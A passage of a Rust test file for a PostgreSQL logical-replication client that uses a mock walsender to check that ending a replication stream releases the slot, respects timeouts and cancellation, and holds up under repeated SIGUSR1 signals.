                let mut out = change;
                out.extend_from_slice(&framed(b'c', b""));
                out.extend_from_slice(&framed(b'C', b"COPY 0\0"));
                out.extend_from_slice(&framed(b'Z', b"I"));
                s.write_all(&out).unwrap();
            }
            Then::Decodes => {}
            Then::Sends => {
                while s.write_all(&change).is_ok() {}
                return told.send(true).unwrap();
            }
            Then::Stalls => {
                let mut out = change;
                out.push(b'd');
                out.extend_from_slice(&1004i32.to_be_bytes());
                out.extend_from_slice(&[b'w'; 10]);
                s.write_all(&out).unwrap();
            }
        }
        let ended = read_msg(&mut s);
        told.send(ended.is_some_and(|(tag, _)| tag == b'X'))
            .unwrap();
    });
    Walsender {
        port,
        released,
        asked,
        terminated,
    }
}

/// A stream started against [`walsender`], its keepalive read.
fn streaming(then: Then) -> (WalStream, Walsender) {
    let w = walsender(then);
    let c = Client::connect_replication(&url(w.port, None)).unwrap();
    let mut wal = c.start_replication("fennec_docs", "fennec_docs").unwrap();
    let first = wal.next(Duration::from_secs(30)).unwrap();
    assert_eq!(
        first,
        Some(Wal::Keepalive {
            end: 7,
            reply: false
        })
    );
    (wal, w)
}

/// Ending a stream waits for the server's answer, which it sends only
/// once the slot is free: a follower that stops returns with its slot let
/// go, never with the server still holding it for a connection it has not
/// read the end of. What the server still sent of the stream is dropped.
#[test]
fn ending_a_stream_waits_for_the_server_to_let_the_slot_go() {
    let (wal, w) = streaming(Then::Answers);
    wal.end(Duration::from_secs(30), &AtomicBool::new(false))
        .unwrap();
    assert!(
        w.released.load(Ordering::SeqCst),
        "the stream ended before the server let the slot go"
    );
    assert!(w.terminated.recv().unwrap(), "no Terminate after the end");
}

/// A server that does not answer -- a walsender decoding a transaction
/// reads nothing until it is through -- one that goes on sending, and one
/// that stops in the middle of a message, its first bytes and a whole one
/// before them already read in, are waited for no longer than asked: every
/// read is held to what is left of the wait, where the rest of a message
/// waited out the socket's own timeout, 30 s. The connection is then
/// closed as before.
#[test]
fn ending_a_stream_is_bounded() {
    for then in [Then::Decodes, Then::Sends, Then::Stalls] {
        let (wal, w) = streaming(then);
        let wait = Duration::from_millis(200);
        let began = Instant::now();
        let e = wal
            .end(wait, &AtomicBool::new(false))
            .unwrap_err()
            .to_string();
        assert!(began.elapsed() >= wait, "{:?}", began.elapsed());
        assert!(
            e.contains("did not end the replication stream within"),
            "{e}"
        );
        assert!(w.terminated.recv().unwrap(), "the connection was not ended");
    }
}

/// The caller's second stop ends the wait while the server still says
/// nothing -- and in the middle of a message -- and the connection is
/// closed.
#[test]
fn ending_a_stream_stops_waiting_once_cut() {
    for then in [Then::Decodes, Then::Stalls] {
        let (wal, w) = streaming(then);
        let cut = Arc::new(AtomicBool::new(false));
        let cutter = {
            let cut = Arc::clone(&cut);
            std::thread::spawn(move || {
                w.asked.recv().unwrap();
                cut.store(true, Ordering::SeqCst);
            })
        };
        let e = wal
            .end(Duration::from_secs(60), &cut)
            .unwrap_err()
            .to_string();
        assert!(e.contains("cut short"), "{e}");
        cutter.join().unwrap();
        assert!(w.terminated.recv().unwrap(), "the connection was not ended");
    }
}

/// SIGUSR1 sent to one thread, its handler doing nothing, installed as the
/// shell installs its own (`signal`, `SA_RESTART`): Linux restarts no
/// `recv` on a socket with a timeout all the same (signal(7)) -- and every
/// socket of the client's has one -- and fails it with `EINTR`; macOS
/// restarts it, and `siginterrupt` gives it Linux's way there. A
/// process-directed SIGINT or SIGTERM lands so on the thread that runs
/// `fennec import --follow`'s follower, its main one. libc's calls are
/// declared here, as the crates declare what they take of it, to add no
/// dependency.
#[cfg(any(target_os = "linux", target_vendor = "apple"))]
pub mod interrupt {
    use std::os::unix::thread::{JoinHandleExt, RawPthread};

    #[cfg(target_os = "linux")]
    const SIGUSR1: i32 = 10;
    #[cfg(target_vendor = "apple")]
    const SIGUSR1: i32 = 30;

    extern "C" {
        fn signal(sig: i32, handler: usize) -> usize;
        #[cfg(target_vendor = "apple")]
        fn siginterrupt(sig: i32, flag: i32) -> i32;
        fn pthread_kill(thread: RawPthread, sig: i32) -> i32;
    }

    extern "C" fn nothing(_sig: i32) {}

    /// SIGUSR1 handled, by nothing, and on macOS restarting nothing it
    /// cuts.
    pub fn arm() {
        static ARMED: std::sync::Once = std::sync::Once::new();
        // SAFETY: `nothing` is a handler of the C signature, which touches
        // nothing, installed once; `siginterrupt` is handed two integers, as
        // declared, reads no memory of ours, and changes only whether a call
        // SIGUSR1 cuts -- this test's signal alone -- is restarted.
        ARMED.call_once(|| unsafe {
            signal(SIGUSR1, nothing as *const () as usize);
            #[cfg(target_vendor = "apple")]
            siginterrupt(SIGUSR1, 1);
        });
    }

    /// SIGUSR1 to `thread`'s thread.
    pub fn send<T>(thread: &std::thread::JoinHandle<T>) {
        // SAFETY: the handle is borrowed, so it is neither joined nor
        // dropped (detached) while this runs: its thread's `pthread_t`,
        // which only a join or a detach frees, names that thread still,
        // running or ended. SIGUSR1 is handled (`arm`).
        unsafe { pthread_kill(thread.as_pthread_t(), SIGUSR1) };
    }
}

/// A signal is neither a failure of the end's wait nor a new start of it:
/// signals every 2 ms through the end of a stream -- the server answering,
/// silent, or stopped in the middle of a message -- and the end comes out
/// as it would without them, a silent server's when its wait is out. A
/// wait begun again at each signal would outlast them all, 10 s.
#[cfg(any(target_os = "linux", target_vendor = "apple"))]
#[test]
fn a_signal_neither_fails_nor_lengthens_the_end_of_a_stream() {
    interrupt::arm();
    for then in [Then::Answers, Then::Decodes, Then::Stalls] {
        let (wal, w) = streaming(then);
        let wait = Duration::from_millis(500);
        let began = Instant::now();
        let ender = std::thread::spawn(move || {
            wal.end(wait, &AtomicBool::new(false))
                .map_err(|e| e.to_string())
        });
        let until = Instant::now() + Duration::from_secs(10);
        while !ender.is_finished() && Instant::now() < until {
            interrupt::send(&ender);
            std::thread::sleep(Duration::from_millis(2));
        }
        let ended = ender.join().unwrap();
        let took = began.elapsed();
        if then == Then::Answers {
            assert_eq!(ended, Ok(()));
            assert!(w.released.load(Ordering::SeqCst));
        } else {
            let e = ended.unwrap_err();
            assert!(
                e.contains("did not end the replication stream within"),
                "{e}"
            );
            assert!(took >= wait, "{took:?}");
            assert!(took < Duration::from_secs(5), "{took:?}");
        }
        assert!(w.terminated.recv().unwrap(), "the connection was not ended");
    }
}
